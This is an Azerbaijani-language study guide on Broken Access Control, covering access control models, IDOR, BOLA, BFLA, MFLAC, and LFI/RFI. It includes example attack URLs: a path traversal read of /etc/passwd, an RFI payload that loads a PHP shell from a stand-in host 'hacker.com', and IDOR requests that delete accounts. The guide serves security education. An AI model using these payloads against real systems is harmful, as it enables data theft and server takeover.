# 🔐 Broken Access Control — Oxuma Materialı

> PDF-dəki bütün mövzular sadə dildə, geniş izahla

---

## 1. Giriş Nəzarəti (Access Control) nədir?

Giriş nəzarəti — bir sistemdə **kimin, nəyə çata biləcəyini** müəyyən edən mexanizmdir. Düşün ki, bir binaya girəndə əvvəlcə qapıçı sənədini yoxlayır (kimsin?), sonra isə hansı mərtəbəyə gedə biləcəyini söyləyir (nəyə icazən var?). Kompüter sistemlərində də eyni prinsip işləyir.

Giriş nəzarəti iki addımdan ibarətdir:

| Addım | Ad | Sual | Nümunə |
|-------|----|------|--------|
| 1 | **Authentication (Autentifikasiya)** | Sən kimsin? | İstifadəçi adı + şifrə ilə sistemə daxil ol |
| 2 | **Authorization (Avtorizasiya)** | Nəyə icazən var? | Daxil olduqdan sonra hansı səhifələrə girə bilərsən |

Bu iki addım həmişə birlikdə lazımdır. Autentifikasiya tək başına kifayət etmir — çünki sisteme daxil olmaq, hər şeyə çatmaq demək deyil. Məsələn, bir tələbə universitetin sisteminə daxil ola bilər (autentifikasiya), amma müəllimlərin qiymət sisteminə girə bilməz (avtorizasiya).

---

## 2. Giriş Nəzarəti Növləri

---

### 🔒 MAC — Məcburi Giriş Nəzarəti (Mandatory Access Control)

MAC-da **sistem özü qərar verir** — istifadəçi heç nəyi dəyişdirə bilməz. Hər faylın və hər istifadəçinin bir "gizlilik səviyyəsi" var. Sistem bu səviyyələri müqayisə edir və icazə verib-vermədiyini özü müəyyənləşdirir. İstifadəçi öz faylını belə başqasına açıq edə bilməz — çünki qərar vermək onun əlində deyil.

MAC sistemdə hər resursun **iki etiketi** var:
- **Təsnifat:** Top Secret / Secret / Confidential / Public
- **Kateqoriya:** Hansı şöbəyə aiddir (məsələn, "Müdafiə Nazirliyi Layihəsi")

Hər istifadəçinin də eyni şəkildə səviyyəsi və kateqoriyası var. Giriş yalnız **hər iki xassə uyğun gəldikdə** mümkündür.

```
Nümunə:
Fayl:         Təsnifat=Secret,    Kateqoriya=Maliyyə
İstifadəçi A: Təsnifat=TopSecret, Kateqoriya=Maliyyə  → GİRİŞ VAR ✅
İstifadəçi B: Təsnifat=TopSecret, Kateqoriya=İT       → GİRİŞ YOX ❌  (kateqoriya uyğun deyil)
İstifadəçi C: Təsnifat=Public,    Kateqoriya=Maliyyə  → GİRİŞ YOX ❌  (səviyyə aşağıdır)
```

**Harada istifadə olunur?** Hökumət qurumları, hərbi sistemlər, gizli dövlət sənədləri. Ən sərt və ən təhlükəsiz növdür, amma idarə etmək çox çətindir — hər faylın, hər hesabın etiketi daim yenilənməlidir.

---

### 👥 RBAC — Rol Əsaslı Giriş Nəzarəti (Role-Based Access Control)

RBAC-da istifadəçiyə birbaşa icazə verilmir — əvvəlcə ona bir **rol** verilir, icazələr isə o rola bağlıdır. Bu, şirkətlərdə ən çox istifadə edilən modeldir. Məsələn, "Mühasib" roluna kim təyin edilsə, avtomatik olaraq maliyyə sistemlərinə çatır — hər mühasib üçün ayrıca icazə qurmağa ehtiyac yoxdur.

```
Mühasib rolu  →  maliyyə sənədləri, maaş cədvəli
IT rolu       →  server, şəbəkə ayarları
Sales rolu    →  müştəri bazası, satış hesabatları
Admin rolu    →  hər şey
```

**RBAC-ın qruplardan fərqi nədir?** Bir istifadəçi bir neçə qrupa aid ola bilər, amma yalnız **bir rola** təyin edilməlidir. Bu, icazələrin qarışmamasını təmin edir.

⚠️ **Rol Sürünməsi (Role Creep) nədir?**
Adam bir şöbədən başqasına keçir, amma köhnə rolunun icazələri silinmir. Zamanla insanın ehtiyacından çox daha artıq icazəsi olur. Bu, təhlükəsizlik riski yaradır — odur ki, rol dəyişikliklərini vaxtında idarə etmək lazımdır.

**Harada istifadə olunur?** WordPress (Admin/Editor/Subscriber), şirkət HR sistemləri, Windows/Linux qrup siyasətləri.

---

### 🧑‍💼 DAC — Diskresion Giriş Nəzarəti (Discretionary Access Control)

DAC-da faylın **sahibi özü** qərar verir — kimin oxuya, kimin yazaya, kimin silə biləcəyini sahibi müəyyənləşdirir. Sistem sahibin bu qərarlarına hörmət edir. Ən tanış nümunə Google Drive-dır: bir sənəd yaradanda sən özün seçirsən ki, onu kimə göndərəsən, kim yalnız oxusun, kim redaktə etsin.

DAC **ACL (Access Control List)** istifadə edir — bu, "bu resurs üçün kimlərə nə icazə vermişəm" siyahısıdır. Hər fayl üçün ayrıca siyahı saxlanılır.

```
Nümunə — Linux fayl icazələri:
chmod 755 fayl.txt
→ Sahibi: oxu+yaz+icra ✅
→ Qrup:   oxu+icra ✅
→ Digər:  oxu+icra ✅ (amma yazmaq yox ❌)
```

**Üstünlüyü:** Çox çevikdir, hər kəs öz resursunu idarə edə bilər.
**Zəifliyi:** Sahibi yanlış icazə versə (məsələn, həssas faylı hamıya açsa), sistem mane olmur. MAC-dan daha az təhlükəsizdir.

**Harada istifadə olunur?** Microsoft Windows fayl sistemi, Google Drive, Dropbox.

---

### 📋 RB-RBAC — Qaydaya Əsaslanan Giriş Nəzarəti (Rule-Based RBAC)

RB-RBAC digər növlərə **əlavə** olaraq işləyir — onların üstünə qoyulan bir filtrdir. Administrator xüsusi qaydalar yazır: "bu şərtlər ödənilsə icazə ver, ödənilməsə vermə." Rol uyğun olsa belə, qayda uyğun deyilsə — giriş olmur.

```
Nümunə:
Qayda 1: Giriş yalnız saat 09:00-17:00 arasında mümkündür
Qayda 2: Giriş yalnız ofis şəbəkəsindən (IP: 192.168.1.x) mümkündür

Müdir axşam saat 22:00-da evdən daxil olmaq istəyir:
→ Rolu uyğundur ✅, amma saat qaydası pozulur ❌ → GİRİŞ YOX
```

**Harada istifadə olunur?** Firewall qaydaları (hansı IP-dən, hansı porta giriş var), VPN siyasətləri, bankların gecə saatlarında əməliyyat məhdudiyyəti.

---

### 🏷️ ABAC — Atribut Əsaslı Giriş Nəzarəti (Attribute-Based Access Control)

ABAC ən çevik və ən müasir modeldir. Qərar yalnız rola deyil, **bir neçə atributun birləşməsinə** əsaslanır. Sistem "if-then" məntiqi ilə işləyir: müəyyən şərtlər ödənilsə icazə ver, ödənilməsə vermə. Bu model çox dəqiq nəzarət imkanı yaradır — eyni şəxs fərqli şəraitdə fərqli icazə ala bilər.

**4 atribut kateqoriyası:**

| Kateqoriya | Nə göstərir? | Nümunələr |
|-----------|-------------|-----------|
| **İstifadəçi atributları** | Kim daxil olmaq istəyir? | ad, vəzifə, şöbə, təhlükəsizlik səviyyəsi |
| **Resurs atributları** | Nəyə çatmaq istəyir? | faylın növü, həssaslıq dərəcəsi, sahibi |
| **Fəaliyyət atributları** | Nə etmək istəyir? | oxu, yaz, sil, köçür |
| **Mühit atributları** | Hansı şəraitdə? | vaxt, yer, istifadə edilən cihaz |

```
Nümunə qayda:
IF   vəzifə = "Mühasib"
AND  resurs_növü = "Maliyyə_Hesabatı"
AND  fəaliyyət = "Oxu"
AND  cihaz = "Korporativ_Laptop"
AND  vaxt = "İş saatları"
THEN → GİRİŞ VER ✅

Eyni mühasib evdən şəxsi noutbukla gecə daxil olmaq istəsə:
AND  cihaz = "Şəxsi_Laptop"  → Şərt ödənilmir → GİRİŞ YOX ❌
```

**Harada istifadə olunur?** AWS IAM siyasətləri, böyük korporativ sistemlər, sağlamlıq məlumatlarını idarə edən sistemlər.

---

## 3. Broken Access Control nədir?

Broken Access Control (BAC) — giriş nəzarəti mexanizminin **düzgün işləmədiyi** vəziyyətdir. Yəni sistem icazəsiz istifadəçinin qorunan resurslara çatmasının qarşısını ala bilmir. Bu, tək bir zəiflik deyil — bir çox fərqli problem növünü əhatə edən geniş bir kateqoriyadır.

OWASP (Open Web Application Security Project) hər il ən kritik veb zəifliklərin siyahısını yayımlayır. 2021-ci ildən Broken Access Control bu siyahının **birinci yerindədir** — yəni dünyada ən çox rast gəlinən veb təhlükəsizlik problemidir.

**İstifadəçi baxışından 3 əsas növü var:**

```
┌─────────────────────────────────────────────────────┐
│               Broken Access Control                  │
├─────────────────────────────────────────────────────┤
│ Vertical   → Aşağı səviyyəli user, üst funksiyaya  │
│              çatır (user → admin)                    │
│                                                      │
│ Horizontal → Eyni səviyyəli user, başqasının        │
│              datasına çatır (user A → user B datası) │
│                                                      │
│ Context    → Yanlış ardıcıllıqla əməliyyat          │
│              icra edilir                             │
└─────────────────────────────────────────────────────┘
```

---

## 4. Vertical Access Control Pozuntusu

Bu pozuntuda adi bir istifadəçi **admin səviyyəsindəki funksiyalara** çatır. Normal halda belə funksiyalar yalnız admin üçün açıq olmalıdır, amma giriş nəzarəti düzgün qurulmayıbsa, hər kəs həmin səhifəyə daxil ola bilir.

```
Normal vəziyyət:
Admin    → /admin/users  →  200 OK ✅
Adi user → /admin/users  →  403 Forbidden ❌

Pozuntu:
Admin    → /admin/users  →  200 OK ✅
Adi user → /admin/users  →  200 OK ✅  ← PROBLEM!
```

**Praktiki nümunə:** Tətbiq admin linkini menyuda göstərmir, amma birilisi URL-i birbaşa yazarsa — sistemə girə bilir. "Göstərməmək" = "qorumaq" demək deyil.

Burp Suite kimi alətlərlə bütün request-lər tutulur və admin endpointləri aşkar edilir.

---

## 5. Horizontal Access Control Pozuntusu

Bu pozuntuda iki istifadəçi **eyni səviyyədədir** (ikisi də adi user), amma biri digərinin şəxsi məlumatlarına çatır. Tipik nümunə: URL-dəki istifadəçi ID-sini dəyişərək başqasının hesabını görmək.

```
Normal vəziyyət:
User A (ID=100) → /profile?id=100  →  öz profili ✅
User A (ID=100) → /profile?id=101  →  403 Forbidden ❌

Pozuntu:
User A (ID=100) → /profile?id=101  →  User B-nin profili görünür 😱
```

Bu, **IDOR** zəifliyinin klassik nümunəsidir (növbəti bölmədə izah olunur).

---

## 6. Context-Dependent Access Control Pozuntusu

Bəzi sistemlərdə icazə **kontekstdən** (nə vaxt, hansı addımdan sonra) asılıdır. Yəni bir əməliyyat yalnız müəyyən addımdan **sonra** edilə bilər. Əgər sistem bu ardıcıllığı yoxlamazsa — istifadəçi adımları atlayaraq yanlış əməliyyat icra edə bilər.

```
E-ticarət nümunəsi:
Düzgün axın:  Məhsulu seç → Ödəniş et → Sifariş tamamlandı
Pozuntu:      Ödəniş et → Sonra səbəti dəyiş → Sistem icazə verir 😱
              (Az pul ödəyib, daha çox məhsul almaq mümkün olur)
```

---

## 7. IDOR — Insecure Direct Object Reference

IDOR o zaman baş verir ki, sistem URL-dəki və ya parametrdəki **obyekt identifikatorunu** (ID, fayl adı, sifariş nömrəsi) yoxlamadan birbaşa verilənlər bazasına göndərir. Hücumçu bu ID-ni əl ilə dəyişərək başqasının resurslarına çatır. Problem odur ki, sistem yalnız "daxil olubmu?" yoxlayır, "bu ID ona aiddir?" sorusunu vermir.

```
Addım 1 — Öz hesabına daxil ol:
https://target.com/viewCart.php?userID=1234
→ Öz səbətini görürsən ✅

Addım 2 — ID-ni dəyiş:
https://target.com/viewCart.php?userID=1235
→ Başqasının səbəti görünür 😱

Addım 3 — Daha ağır hücumlar:
https://target.com/deleteAccount.php?userID=1235   → hesabı sil
https://target.com/changeAddress.php?userID=1235   → ünvanı dəyiş
https://target.com/viewPayment.php?userID=1235     → ödəniş məlumatları
```

IDOR yalnız rəqəmli ID-lərlə məhdud deyil — fayl adları, UUID-lər, sifarış nömrələri də hədəf ola bilər.

---

## 8. BOLA — Broken Object Level Authorization

BOLA əslində IDOR-un **API versiyasıdır** — hər ikisi eyni problemi təsvir edir, sadəcə müxtəlif kontekstdə istifadə olunur. IDOR termini köhnə veb tətbiqlərdən gəlir, BOLA isə müasir REST API-lər üçün OWASP tərəfindən təqdim edilib. OWASP API Security Top 10-da **birinci yerdir**.

Problem belədir: API istifadəçinin daxil olub-olmadığını yoxlayır (autentifikasiya), amma sorğuladığı obyektin həqiqətən ona aid olub-olmadığını yoxlamır (avtorizasiya).

```
Normal:
GET /api/userInfo/1234   →  öz məlumatın: {ad, email, ünvan} ✅

Manipulyasiya:
GET /api/userInfo/1235   →  başqasının məlumatı: {ad, email, kredit kartı} 😱
```

**BOLA vs IDOR fərqi qısaca:**
- IDOR → klassik veb URL-lərdə (query parameter: `?id=123`)
- BOLA → müasir API endpoint-lərində (`/api/users/123`)
- İkisi də eyni kökdən gəlir, eyni şəkildə qarşısı alınır

---

## 9. BFLA — Broken Function Level Authorization

BFLA-da istifadəçi **icazəsi olmayan funksiyaya** çatır. BOLA-dan fərqi budur: BOLA-da istifadəçi icazəli funksiyaya girər, amma **yanlış obyekti** (başqasının datasını) sorğular. BFLA-da isə istifadəçi tamamilə **icazəsiz funksiyaya** (admin endpointinə) çatır.

```
Normal istifadəçi API-si:
GET /api/users/my_info  →  {ad, email, rol: "user"} ✅

BFLA hücumu — yalnız admin üçün olan endpoint-ə giriş:
GET /api/admins/all_info  →  bütün istifadəçilərin məlumatı 😱
                              {ad, email, kredit kartı, rol: "admin"}
```

```
ORIGINAL (normal):  GET /api/users/v1/user/myinfo
TAMPERED (hücum):   GET /api/admins/v1/users/all
```

Tətbiq admin funksiyasını UI-da göstərmir, amma server tərəfdə yoxlama aparmır. Hücumçu Burp Suite ilə requst-i tutub endpoint-i dəyişdirir.

---

## 10. MFLAC — Missing Function Level Access Control

MFLAC-da funksiya səviyyəsindəki giriş nəzarəti **tamamilə yoxdur**. Tətbiq bir əməliyyata icazə yoxlayır, amma ona bənzər digər əməliyyata yoxlamır. Developer məsələn "redaktə et" funksiyası üçün icazə qurur, amma "sil" funksiyası üçün unutur.

```
POST /account/edit.php    →  200 OK ✅  (icazə yoxlandı)
POST /account/delete.php  →  200 OK ✅  (icazə yoxlanmadı! 😱)

Hər iki endpoint eyni JSON body qəbul edir:
{
  "userid": "5678",
  "name": "...",
  "address": "..."
}
```

Hücumçu edit endpoint-ini tapır, eyni strukturla delete endpoint-ini sınayır — sistem heç bir yoxlama aparmadan siləcək.

---

## 11. LFI və RFI — Fayl Daxil Etmə Zəiflikləri

Bu zəifliklər adətən Broken Access Control ilə birlikdə istifadə olunur.

**LFI (Local File Inclusion) — Yerli Fayl Daxil Etmə:**
Serverdəki faylları URL vasitəsilə oxumaq. `../` ifadəsi qovluqları geri keçmək üçün istifadə olunur — buna **Path Traversal** deyilir.

```
Normal:
http://example.com/page.php?file=about.html  →  about.html göstərilir

LFI hücumu:
http://example.com/page.php?file=../../../../etc/passwd
→ Linux-un istifadəçi siyahısı oxunur 😱

../../../../  =  dörd qovluq geri get  →  root-a çat  →  /etc/passwd oxu
```

**RFI (Remote File Inclusion) — Uzaq Fayl Daxil Etmə:**
Hücumçunun öz serverindəki zərərli faylı hədəf serverə daxil etmək. Hədəf server həmin faylı **öz adına** icra edir — bu, tam server ələ keçirməyə qədər gedə bilər.

```
RFI hücumu:
http://example.com/index.php?file=http://hacker.com/shell.php
→ hacker.com-dakı PHP shell hədəf serverdə işləyir 😱
→ Hücumçu serverə tam giriş əldə edir
```

---

## 12. Hamısının Fərqi — Qısa Müqayisə

| Zəiflik | Nə baş verir? | Hücum növü |
|---------|--------------|------------|
| **IDOR** | URL-dəki ID dəyişdirilir, başqasının datası görünür | Horizontal |
| **BOLA** | API-də eyni problem — obyekt sahibliyi yoxlanmır | Horizontal |
| **BFLA** | Adi user admin funksiyasına çatır | Vertical |
| **MFLAC** | Bəzi funksiyaların heç icazə yoxlaması yoxdur | Vertical |
| **LFI** | Server faylları URL ilə oxunur | - |
| **RFI** | Uzaq zərərli fayl serverə daxil edilir | - |

---

## 13. Real Dünya Nümunəsi

2024-cü ildə bir xəstəxananın xəstə portalında BOLA zəifliyi tapıldı. Xəstənin laboratoriya nəticələrini göstərən URL-dəki sənəd ID-sini dəyişməklə başqa xəstənin nəticələrini görmək mümkün idi. Bunu bir xəstə təsadüfən yanlış URL yazanda kəşf etdi — hücum üçün heç bir texniki bilik lazım deyildi, sadəcə bir rəqəmi dəyişmək kifayət idi.

---

## 14. Xülasə Cədvəli

| Termin | Bir cümlə ilə |
|--------|--------------|
| **Authentication** | Sistemə kim daxil olur? (login/şifrə) |
| **Authorization** | Daxil olan nəyə çata bilər? (icazə) |
| **MAC** | Sistem qərar verir, insan dəyişdirə bilməz |
| **RBAC** | Roluna görə icazən var |
| **DAC** | Öz resursuna özün icazə verirsən |
| **RB-RBAC** | Əlavə şərtlər ödənilməsə giriş yoxdur |
| **ABAC** | Çoxlu atributlara əsasən qərar verilir |
| **BAC** | Giriş nəzarəti qırılıb — ümumi kateqoriya |
| **IDOR** | URL-dəki ID-ni dəyiş, başqasının datasını gör |
| **BOLA** | IDOR-un API versiyası |
| **BFLA** | Adi user admin funksiyasına çatır |
| **MFLAC** | Funksiya üçün heç bir nəzarət qurulmayıb |
| **LFI** | `../` ilə server fayllarını oxu |
| **RFI** | Uzaq zərərli faylı serverə daxil et |

---

*Hazırlandı: 2026 | Mənbələr: OWASP, PortSwigger, Kurs PDF + internet araşdırması*
